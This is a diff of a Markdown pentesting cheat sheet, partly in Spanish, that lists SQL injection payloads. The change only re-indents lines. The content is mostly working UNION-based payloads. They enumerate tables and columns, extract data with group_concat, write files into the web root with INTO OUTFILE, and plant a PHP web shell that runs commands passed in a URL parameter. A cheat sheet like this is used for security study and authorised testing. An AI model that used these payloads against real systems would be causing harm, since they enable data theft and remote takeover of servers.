@@ -71,10 +71,10 @@ https://cheatsheet.haax.fr/web-pentest/injections/server-side-injections/sql/
 #### Tablas
     ' Union select table_name from information_schema.tables where table_schema="nameDB" -- -
 #### Columnas
-' Union Select column_name from information_schema.columns where table_schema="nameDB" and table_name="nameTable" -- -
+    ' Union Select column_name from information_schema.columns where table_schema="nameDB" and table_name="nameTable" -- -
 #### Data extract
-' Union select group_concat(column1,...,coluumnN) from <tablenale> -- -
+    ' Union select group_concat(column1,...,coluumnN) from <tablenale> -- -
 #### Upload file or Create content
-' Union Select "Probando" into outfile "/var/www/html/prueba.txt" -- -
+    ' Union Select "Probando" into outfile "/var/www/html/prueba.txt" -- -
 #### PHP with SQLi
     'Union Select "<?php system($_GET['cmd'];?>" into outfile "/var/www/html/commandExec.php" -- -
